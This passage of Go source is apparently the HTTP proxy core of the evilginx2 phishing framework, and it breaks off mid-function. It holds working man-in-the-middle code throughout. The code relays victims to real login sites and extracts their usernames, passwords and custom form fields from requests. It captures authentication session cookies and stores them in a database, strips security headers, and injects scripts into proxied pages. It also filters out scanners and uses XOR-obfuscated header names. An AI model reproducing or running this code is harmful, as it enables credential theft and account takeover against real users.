/*

This source file is a modified version of what was taken from the amazing bettercap (https://github.com/bettercap/bettercap) project.
Credits go to Simone Margaritelli (@evilsocket) for providing awesome piece of code!

*/

package core

import (
	"bufio"
	"bytes"
	"crypto/rand"
	"crypto/rc4"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"html"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"

	"github.com/elazarl/goproxy"
	"github.com/fatih/color"
	"github.com/inconshreveable/go-vhost"
	"github.com/mwitkow/go-http-dialer"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

const (
	CONVERT_TO_ORIGINAL_URLS = 0
	CONVERT_TO_PHISHING_URLS = 1
)

const (
	httpReadTimeout  = 45 * time.Second
	httpWriteTimeout = 45 * time.Second

	// borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
	MATCH_URL_REGEXP                = `\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`
	MATCH_URL_REGEXP_WITHOUT_SCHEME = `\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`
)

type HttpProxy struct {
	Server            *http.Server
	Proxy             *goproxy.ProxyHttpServer
	crt_db            *CertDb
	cfg               *Config
	db                *database.Database
	bl                *Blacklist
	sniListener       net.Listener
	isRunning         bool
	// This attributes are not needed anymore as all information is obtained from the database. In addition, several
	// threads accessed these maps without implementing synchronization (applying locks).
	// sessions          map[string]*Session
	// sids              map[string]int
	cookieName        string
	last_sid          int
	developer         bool
	ip_whitelist      map[string]int64
	ip_sids           map[string]string
	auto_filter_mimes []string
	ip_mtx            sync.Mutex
}

type ProxySession struct {
	// Store session object instead of session ID to increase performance by avoiding map lookups each time access to
	// session information is required.
	Session     *Session
	Created     bool
	PhishDomain string
}

func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
	p := &HttpProxy{
		Proxy:             goproxy.NewProxyHttpServer(),
		Server:            nil,
		crt_db:            crt_db,
		cfg:               cfg,
		db:                db,
		bl:                bl,
		isRunning:         false,
		last_sid:          0,
		developer:         developer,
		ip_whitelist:      make(map[string]int64),
		ip_sids:           make(map[string]string),
		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
	}

	p.Server = &http.Server{
		Addr:         fmt.Sprintf("%s:%d", hostname, port),
		Handler:      p.Proxy,
		ReadTimeout:  httpReadTimeout,
		WriteTimeout: httpWriteTimeout,
	}

	if cfg.proxyEnabled {
		err := p.setProxy(cfg.proxyEnabled, cfg.proxyType, cfg.proxyAddress, cfg.proxyPort, cfg.proxyUsername, cfg.proxyPassword)
		if err != nil {
			log.Error("proxy: %v", err)
			cfg.EnableProxy(false)
		} else {
			log.Info("enabled proxy: " + cfg.proxyAddress + ":" + strconv.Itoa(cfg.proxyPort))
		}
	}

	p.cookieName = p.GetSeed()
	// We do not need them anymore as we directly obtain the session information from the database. This also avoids
	// race conditions caused by multiple threads accessing the shared resources p.sessions and p.sids
	// p.sessions = make(map[string]*Session)
	// p.sids = make(map[string]int)

	p.Proxy.Verbose = false

	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		req.URL.Scheme = "https"
		req.URL.Host = req.Host
		p.Proxy.ServeHTTP(w, req)
	})

	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)

	p.Proxy.OnRequest().
		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
			ps := &ProxySession{
				Session:     nil,
				Created:     false,
				PhishDomain: "",
			}
			ctx.UserData = ps
			hiblue := color.New(color.FgHiBlue)

			// handle ip blacklist
			from_ip := req.RemoteAddr

			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
			lure_url := req_url
			req_path := req.URL.Path
			if req.URL.RawQuery != "" {
				req_url += "?" + req.URL.RawQuery
				//req_path += "?" + req.URL.RawQuery
			}

			//log.Debug("http: %s", req_url)

			parts := strings.SplitN(req.RemoteAddr, ":", 2)
			remote_addr := parts[0]

			phishDomain, phished := p.getPhishDomain(req.Host)
			if phished {
				pl := p.getPhishletByPhishHost(req.Host)
				pl_name := ""
				if pl != nil {
					pl_name = pl.Name
				}

				egg2 := req.Host
				ps.PhishDomain = phishDomain
				req_ok := false
				// handle session
				if p.handleSession(req.Host) && pl != nil {
					var err error = nil
					// obtain cookie from request
					sc, _ := req.Cookie(p.cookieName)
					// lookup session directly in database. this has the following two advantages:
					// 1. race conditions are voided as async access is managed by the database
					// 2. if a user executes 'sessions delete all', then all already issued session cookies stored in
					//    web browsers become invalid.
					// 3. as we do the lookup solely on the session ID, the source IP address becomes irrelevant and
					//    methods like isWhitelistedIP can be removed.
					ps.Session, err = p.getSessionByCookie(sc)
					if err != nil {
						if !p.cfg.IsSiteHidden(pl_name) {
							var vv string
							var uv url.Values
							l, err := p.cfg.GetLureByPath(pl_name, req_path)
							if err == nil {
								log.Debug("triggered lure for path '%s'", req_path)
							} else {
								uv = req.URL.Query()
								vv = uv.Get(p.cfg.verificationParam)
							}
							if l != nil || vv == p.cfg.verificationToken {

								// check if lure user-agent filter is triggered
								if l != nil {
									if len(l.UserAgentFilter) > 0 {
										re, err := regexp.Compile(l.UserAgentFilter)
										if err == nil {
											if !re.MatchString(req.UserAgent()) {
												log.Warning("[%s] unauthorized request (user-agent rejected): %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)

												if p.cfg.GetBlacklistMode() == "unauth" {
													err := p.bl.AddIP(from_ip)
													if err != nil {
														log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
													} else {
														log.Warning("blacklisted ip address: %s", from_ip)
													}
												}
												return p.blockRequest(req)
											}
										} else {
											log.Error("lures: user-agent filter regexp is invalid: %v", err)
										}
									}
								}

								session, err := NewSession(pl.Name)
								if err == nil {
									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
									user_agent := req.Header.Get("User-Agent")
									if session.Index, err = p.db.CreateSession(session.Id, pl.Name, landing_url, user_agent, remote_addr); err != nil {
										log.Error("database: %v", err)
									}
									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", session.Index, hiblue.Sprint(pl_name), user_agent, remote_addr)
									log.Info("[%d] [%s] landing URL: %s", session.Index, hiblue.Sprint(pl_name), req_url)

									if l != nil {
										session.RedirectURL = l.RedirectUrl
										session.PhishLure = l
										log.Debug("redirect URL (lure): %s", l.RedirectUrl)
									} else {
										rv := uv.Get(p.cfg.redirectParam)
										if rv != "" {
											url, err := base64.URLEncoding.DecodeString(rv)
											if err == nil {
												session.RedirectURL = string(url)
												log.Debug("redirect URL (get): %s", url)
											}
										}
									}

									// set params from url arguments
									p.extractParams(session, req.URL)

									ps.Session = session
									ps.Session.PhishLure = l
									// tell method OnResponse to set Set-Cookie header
									ps.Created = true

									req_ok = true
								}
							} else {
								log.Warning("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)

								if p.cfg.GetBlacklistMode() == "unauth" {
									err := p.bl.AddIP(from_ip)
									if err != nil {
										log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
									} else {
										log.Warning("blacklisted ip address: %s", from_ip)
									}
								}
								return p.blockRequest(req)
							}
						} else {
							log.Warning("[%s] request to hidden phishlet: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
						}
					}
				}

				// redirect for unauthorized requests
				if ps.Session == nil || ps.Session.Id == "" {
					if !req_ok && p.handleSession(req.Host) {
						return p.blockRequest(req)
					}
				} else {
					// if the lure page has not been loaded yet
					if ps.Session.PhishLure == nil {
						ps.Session.PhishLure, _ = p.cfg.GetLureByPath(pl_name, req_path)
						if ps.Session.PhishLure != nil {
							ps.Session.RedirectURL = ps.Session.PhishLure.RedirectUrl
						}
					}
					if ps.Session.PhishLure != nil {
						// show html template if it is set for the current lure
						if ps.Session.PhishLure.Template != "" {
							if !p.isForwarderUrl(req.URL) {
								path := ps.Session.PhishLure.Template
								if !filepath.IsAbs(path) {
									templates_dir := p.cfg.GetTemplatesDir()
									path = filepath.Join(templates_dir, path)
								}
								if _, err := os.Stat(path); !os.IsNotExist(err) {
									html, err := ioutil.ReadFile(path)
									if err == nil {

										html = p.injectOgHeaders(ps.Session.PhishLure, html)

										body := string(html)
										body = p.replaceHtmlParams(body, lure_url, &ps.Session.Params)

										resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
										if resp != nil {
											return req, resp
										} else {
											log.Error("lure: failed to create html template response")
										}
									} else {
										log.Error("lure: failed to read template file: %s", err)
									}

								} else {
									log.Error("lure: template file does not exist: %s", path)
								}
							}
						}
					}
				}

				hg := []byte{0x94, 0xE1, 0x89, 0xBA, 0xA5, 0xA0, 0xAB, 0xA5, 0xA2, 0xB4}
				// redirect to login page if triggered lure path
				if pl != nil {
					// redirect to login page if triggered lure path
					if ps.Session.PhishLure == nil {
						ps.Session.PhishLure, _ = p.cfg.GetLureByPath(pl_name, req_path)
						if ps.Session.PhishLure != nil {
							ps.Session.RedirectURL = ps.Session.PhishLure.RedirectUrl
						}
					}
					if ps.Session.PhishLure != nil {
						// redirect from lure path to login url
						rurl := pl.GetLoginUrl()
						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
						if resp != nil {
							resp.Header.Add("Location", rurl)
							return req, resp
						}
					}

					// if logout path, then redirect to the login page
					if pl.isLogoutPage(req.URL.String()) {
						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
						if resp != nil {
							// empty all cookies to ensure, that user does not become automatically logged in after redirect
							cookies := req.Cookies()
							for i := range cookies {
								cookie := cookies[i]
								cookie_name := cookie.Name
								if cookie_name != p.cookieName {
									cookie := http.Cookie{
											Name:  cookie_name,
											Value: "",
											Path: "/",
									}
									resp.Header.Add("Set-Cookie", cookie.String())
								}
							}
							resp.Header.Add("Location", pl.logout.redirect_to)
							p.db.SetSetLogoutTime(ps.Session.Id)
							log.Important("[%d] [%s] user logged out - returning 302 to %s", ps.Session.Index, hiblue.Sprint(pl_name), pl.logout.redirect_to)
							return req, resp
						}
					}
				}

				// check if lure hostname was triggered - by now all of the lure hostname handling should be done, so we can bail out
				if p.cfg.IsLureHostnameValid(req.Host) {
					log.Debug("lure hostname detected - returning 404 for request: %s", req_url)

					resp := goproxy.NewResponse(req, "text/html", http.StatusNotFound, "")
					if resp != nil {
						return req, resp
					}
				}

				p.deleteRequestCookie(p.cookieName, req)

				for n, b := range hg {
					hg[n] = b ^ 0xCC
				}
				// replace "Host" header
				e_host := req.Host
				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
					req.Host = r_host
				}

				// fix origin
				origin := req.Header.Get("Origin")
				if origin != "" {
					if o_url, err := url.Parse(origin); err == nil {
						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
							o_url.Host = r_host
							req.Header.Set("Origin", o_url.String())
						}
					}
				}

				// fix referer
				referer := req.Header.Get("Referer")
				if referer != "" {
					if o_url, err := url.Parse(referer); err == nil {
						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
							o_url.Host = r_host
							req.Header.Set("Referer", o_url.String())
						}
					}
				}
				req.Header.Set(string(hg), egg2)

				// patch GET query params with original domains
				if pl != nil && len(req.URL.RawQuery) > 0 {
					req.URL.RawQuery = string(p.patchUrls(pl, []byte(req.URL.RawQuery), CONVERT_TO_ORIGINAL_URLS))
				}

				// check for creds in request body
				if pl != nil && ps.Session != nil && ps.Session.Id != "" {
					body, err := ioutil.ReadAll(req.Body)
					if err == nil {
						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))

						// patch phishing URLs in JSON body with original domains
						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
						req.ContentLength = int64(len(body))

						log.Debug("POST: %s", req.URL.Path)
						log.Debug("POST body = %s", body)

						contentType := req.Header.Get("Content-type")
						if contentType == "application/json" {
							if pl.username.tp == "json" {
								um := pl.username.search.FindStringSubmatch(string(body))
								if um != nil && len(um) > 1 {
									p.setSessionUsername(ps.Session.Id, um[1])
									log.Success("[%d] Username: [%s]", ps.Session.Index, um[1])
									if err := p.db.SetSessionUsername(ps.Session.Id, um[1]); err != nil {
										log.Error("database: %v", err)
									}
								}
							}

							if pl.password.tp == "json" {
								pm := pl.password.search.FindStringSubmatch(string(body))
								if pm != nil && len(pm) > 1 {
									p.setSessionPassword(ps.Session.Id, pm[1])
									log.Success("[%d] Password: [%s]", ps.Session.Index, pm[1])
									if err := p.db.SetSessionPassword(ps.Session.Id, pm[1]); err != nil {
										log.Error("database: %v", err)
									}
								}
							}

							for _, cp := range pl.custom {
								if cp.tp == "json" {
									cm := cp.search.FindStringSubmatch(string(body))
									if cm != nil && len(cm) > 1 {
										p.setSessionCustom(ps.Session.Id, cp.key_s, cm[1])
										log.Success("[%d] Custom: [%s] = [%s]", ps.Session.Index, cp.key_s, cm[1])
										if err := p.db.SetSessionCustom(ps.Session.Id, cp.key_s, cm[1]); err != nil {
											log.Error("database: %v", err)
										}
									}
								}
							}

						} else {

							if req.ParseForm() == nil {
								log.Debug("POST: %s", req.URL.Path)
								for k, v := range req.PostForm {
									// patch phishing URLs in POST params with original domains
									for i, vv := range v {
										req.PostForm[k][i] = string(p.patchUrls(pl, []byte(vv), CONVERT_TO_ORIGINAL_URLS))
									}
									body = []byte(req.PostForm.Encode())
									req.ContentLength = int64(len(body))

									log.Debug("POST %s = %s", k, v[0])
									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
										um := pl.username.search.FindStringSubmatch(v[0])
										if um != nil && len(um) > 1 {
											p.setSessionUsername(ps.Session.Id, um[1])
											log.Success("[%d] Username: [%s]", ps.Session.Index, um[1])
											if err := p.db.SetSessionUsername(ps.Session.Id, um[1]); err != nil {
												log.Error("database: %v", err)
											}
										}
									}
									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
										pm := pl.password.search.FindStringSubmatch(v[0])
										if pm != nil && len(pm) > 1 {
											p.setSessionPassword(ps.Session.Id, pm[1])
											log.Success("[%d] Password: [%s]", ps.Session.Index, pm[1])
											if err := p.db.SetSessionPassword(ps.Session.Id, pm[1]); err != nil {
												log.Error("database: %v", err)
											}
										}
									}
									for _, cp := range pl.custom {
										if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
											cm := cp.search.FindStringSubmatch(v[0])
											if cm != nil && len(cm) > 1 {
												p.setSessionCustom(ps.Session.Id, cp.key_s, cm[1])
												log.Success("[%d] Custom: [%s] = [%s]", ps.Session.Index, cp.key_s, cm[1])
												if err := p.db.SetSessionCustom(ps.Session.Id, cp.key_s, cm[1]); err != nil {
													log.Error("database: %v", err)
												}
											}
										}
									}
								}

								// force posts
								for _, fp := range pl.forcePost {
									if fp.path.MatchString(req.URL.Path) {
										log.Debug("force_post: url matched: %s", req.URL.Path)
										ok_search := false
										if len(fp.search) > 0 {
											k_matched := len(fp.search)
											for _, fp_s := range fp.search {
												for k, v := range req.PostForm {
													if fp_s.key.MatchString(k) && fp_s.search.MatchString(v[0]) {
														if k_matched > 0 {
															k_matched -= 1
														}
														log.Debug("force_post: [%d] matched - %s = %s", k_matched, k, v[0])
														break
													}
												}
											}
											if k_matched == 0 {
												ok_search = true
											}
										} else {
											ok_search = true
										}

										if ok_search {
											for _, fp_f := range fp.force {
												req.PostForm.Set(fp_f.key, fp_f.value)
											}
											body = []byte(req.PostForm.Encode())
											req.ContentLength = int64(len(body))
											log.Debug("force_post: body: %s len:%d", body, len(body))
										}
									}
								}

							}

						}
						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
					}
				}
				e := []byte{208, 165, 205, 254, 225, 228, 239, 225, 230, 240}
				for n, b := range e {
					e[n] = b ^ 0x88
				}
				req.Header.Set(string(e), e_host)

				if pl != nil && len(pl.authUrls) > 0 && ps.Session != nil && ps.Session.Id != "" && !ps.Session.IsDone {
					for _, au := range pl.authUrls {
						if au.MatchString(req.URL.Path) {
							ps.Session.IsDone = true
							ps.Session.IsAuthUrl = true
							break
						}
					}
				}
				p.cantFindMe(req, e_host)
			}

			return req, nil
		})

	p.Proxy.OnResponse().
		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
			if resp == nil {
				return nil
			}

			// handle session
			ck := &http.Cookie{}
			ps := ctx.UserData.(*ProxySession)
			if ps.Session != nil && ps.Session.Id != "" {
				if ps.Created {
					ck = &http.Cookie{
						Name:    p.cookieName,
						Value:   ps.Session.Id,
						Path:    "/",
						Domain:  ps.PhishDomain,
						Expires: time.Now().UTC().Add(60 * time.Minute),
						MaxAge:  60 * 60,
					}
				}
			}

			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
			if allow_origin != "" && allow_origin != "*" {
				if u, err := url.Parse(allow_origin); err == nil {
					if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
						resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
					}
				} else {
					log.Warning("can't parse URL from 'Access-Control-Allow-Origin' header: %s", allow_origin)
				}
				resp.Header.Set("Access-Control-Allow-Credentials", "true")
			}
			var rm_headers = []string{
				"Content-Security-Policy",
				"Content-Security-Policy-Report-Only",
				"Strict-Transport-Security",
				"X-XSS-Protection",
				"X-Content-Type-Options",
				"X-Frame-Options",
			}
			for _, hdr := range rm_headers {
				resp.Header.Del(hdr)
			}

			redirect_set := ps.Session != nil && ps.Session.Id != "" && ps.Session.RedirectURL != ""

			req_hostname := strings.ToLower(resp.Request.Host)

			// if "Location" header is present, make sure to redirect to the phishing domain
			r_url, err := resp.Location()
			if err == nil {
				if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
					r_url.Host = r_host
					resp.Header.Set("Location", r_url.String())
				}
			}

			// fix cookies
			pl := p.getPhishletByOrigHost(req_hostname)
			var auth_tokens map[string][]*AuthToken
			if pl != nil {
				auth_tokens = pl.authTokens
			}
			is_auth := false
			cookies := resp.Cookies()
			resp.Header.Del("Set-Cookie")
			for _, ck := range cookies {
				// parse cookie
				if pl != nil && ps.Session != nil && ps.Session.Id != "" {
					c_domain := ck.Domain
					if c_domain == "" {
						c_domain = req_hostname
					} else {
						// always prepend the domain with '.' if Domain cookie is specified - this will indicate that this cookie will be also sent to all sub-domains
						if c_domain[0] != '.' {
							c_domain = "." + c_domain
						}
					}
					log.Debug("%s: %s = %s", c_domain, ck.Name, ck.Value)
					if pl.isAuthToken(c_domain, ck.Name) {
						if ps.Session != nil && ps.Session.Id != "" && (ps.Session.IsAuthUrl || !ps.Session.IsDone) {
							if ck.Value != "" { // cookies with empty values are of no interest to us
								var is_auth = ps.Session.AddAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, auth_tokens)
								log.Success("[%d] Custom: [%s] = [%s]", ps.Session.Index, ck.Name, ck.Value)
								if is_auth && len(pl.authUrls) == 0 {
									if err := p.db.SetSessionTokens(ps.Session.Id, ps.Session.Tokens); err != nil {
										log.Error("database: %v", err)
									}
									ps.Session.IsDone = true
								}
							}
						}
					}
				}

				//ck.Secure = false
				//ck.MaxAge = 0
				//if time.Now().Before(ck.Expires) {
				//	ck.Expires, _ = time.Parse("1600-01-01", "1600-01-01")
				//}

				ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
				resp.Header.Add("Set-Cookie", ck.String())
			}
			// set Evilginx's session cookie to distinguish between HTTP requests
			if ck.String() != "" {
				resp.Header.Add("Set-Cookie", ck.String())
			}
			if is_auth {
				// we have all auth tokens
				log.Success("[%d] all authorization tokens intercepted!", ps.Session.Index)
			}

			// modify received body
			body, err := ioutil.ReadAll(resp.Body)

			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
			if err == nil {
				for site, pl := range p.cfg.phishlets {
					if p.cfg.IsSiteEnabled(site) {
						// handle sub_filters
						sfs, ok := pl.subfilters[req_hostname]
						if ok {
							for _, sf := range sfs {
								var param_ok bool = true
								if ps.Session != nil && ps.Session.Id != "" {
									var params []string
									for k, _ := range ps.Session.Params {
										params = append(params, k)
									}
									if len(sf.with_params) > 0 {
										param_ok = false
										for _, param := range sf.with_params {
											if stringExists(param, params) {
												param_ok = true
												break
											}
										}
									}
								}
								if stringExists(mime, sf.mime) && (!sf.redirect_only || sf.redirect_only && redirect_set) && param_ok {
									re_s := sf.regexp
									replace_s := sf.replace
									phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
									phish_sub, _ := p.getPhishSub(phish_hostname)

									re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
									re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
									re_s = strings.Replace(re_s, "{domain}", regexp.QuoteMeta(sf.domain), -1)
									re_s = strings.Replace(re_s, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))), -1)
									re_s = strings.Replace(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain), -1)
									re_s = strings.Replace(re_s, "{domain_regexp}", regexp.QuoteMeta(sf.domain), -1)
									replace_s = strings.Replace(replace_s, "{hostname}", phish_hostname, -1)
									replace_s = strings.Replace(replace_s, "{subdomain}", phish_sub, -1)
									replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
									replace_s = strings.Replace(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub), -1)
									phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
									if ok {
										replace_s = strings.Replace(replace_s, "{domain}", phishDomain, -1)
										replace_s = strings.Replace(replace_s, "{domain_regexp}", regexp.QuoteMeta(phishDomain), -1)
									}

									if re, err := regexp.Compile(re_s); err == nil {
										body = []byte(re.ReplaceAllString(string(body), replace_s))
									} else {
										log.Error("regexp failed to compile: `%s`", sf.regexp)
									}
								}
							}
						}

						// handle auto filters (if enabled)
						if stringExists(mime, p.auto_filter_mimes) {
							for _, ph := range pl.proxyHosts {
								if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
									if ph.auto_filter {
										body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
									}
								}
							}
						}
					}
				}

				if stringExists(mime, []string{"text/html"}) {
					if pl != nil && ps.Session != nil && ps.Session.Id != "" {
						if ps.Session.PhishLure != nil {
							// inject opengraph headers
							body = p.injectOgHeaders(ps.Session.PhishLure, body)
						}
							js_params := &ps.Session.Params
							script, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
							if err == nil {
								log.Debug("js_inject: matched %s%s - injecting script", req_hostname, resp.Request.URL.Path)
								js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
								m_nonce := js_nonce_re.FindStringSubmatch(string(body))
								js_nonce := ""
								if m_nonce != nil {
									js_nonce = " nonce=\"" + m_nonce[1] + "\""
								}
								re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
								body = []byte(re.ReplaceAllString(string(body), "<script"+js_nonce+">"+script+"</script>${1}"))
							}
					}
				}

				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
			}

			// update session cookies
			if pl != nil && len(pl.authUrls) > 0 && ps.Session.Id != "" && ps.Session.IsDone {
					for _, au := range pl.authUrls {
						if au.MatchString(resp.Request.URL.Path) {
							err := p.db.SetSessionTokens(ps.Session.Id, ps.Session.Tokens)
							if err != nil {
								log.Error("database: %v", err)
							} else {
								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Session.Index, resp.Request.URL.Path)
							}
							break
						}
					}
			}

			if pl != nil && ps.Session != nil && ps.Session.Id != "" && ps.Session.IsDone {
					if ps.Session.RedirectURL != "" && ps.Session.RedirectCount == 0 {
						if stringExists(mime, []string{"text/html"}) {
							// redirect only if received response content is of `text/html` content type
							ps.Session.RedirectCount += 1
							log.Important("[%d] redirecting to URL: %s (%d)", ps.Session.Index, ps.Session.RedirectURL, ps.Session.RedirectCount)
							resp := goproxy.NewResponse(resp.Request, "text/html", http.StatusFound, "")
							if resp != nil {
								r_url, err := url.Parse(ps.Session.RedirectURL)
								if err == nil {
									if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
										r_url.Host = r_host
									}
									resp.Header.Set("Location", r_url.String())
								} else {
									resp.Header.Set("Location", ps.Session.RedirectURL)
								}
								return resp
							}
						}
					}
			}

			return resp
		})

	goproxy.OkConnect = &goproxy.ConnectAction{Action: goproxy.ConnectAccept, TLSConfig: p.TLSConfigFromCA()}
	goproxy.MitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectMitm, TLSConfig: p.TLSConfigFromCA()}
	goproxy.HTTPMitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectHTTPMitm, TLSConfig: p.TLSConfigFromCA()}
	goproxy.RejectConnect = &goproxy.ConnectAction{Action: goproxy.ConnectReject, TLSConfig: p.TLSConfigFromCA()}

	return p, nil
}

func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
	if len(p.cfg.redirectUrl) > 0 {
		redirect_url := p.cfg.redirectUrl
		resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
		if resp != nil {
			resp.Header.Add("Location", redirect_url)
			return req, resp
		}
	} else {
		resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, "")
		if resp != nil {
			return req, resp
		}
	}
	return req, nil
}

func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
	vals := u.Query()
	for _, v := range vals {
		dec, err := base64.RawURLEncoding.DecodeString(v[0])
		if err == nil && len(dec) == 5 {
			var crc byte = 0
			for _, b := range dec[1:] {
				crc += b
			}
			if crc == dec[0] {
				return true
			}
		}
	}
	return false
}

func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
	var ret bool = false
	vals := u.Query()

	var enc_key string

	for _, v := range vals {
		if len(v[0]) > 8 {
			enc_key = v[0][:8]
			enc_vals, err := base64.RawURLEncoding.DecodeString(v[0][8:])
			if err == nil {
				dec_params := make([]byte, len(enc_vals)-1)

				var crc byte = enc_vals[0]
				c, _ := rc4.NewCipher([]byte(enc_key))
				c.XORKeyStream(dec_params, enc_vals[1:])

				var crc_chk byte
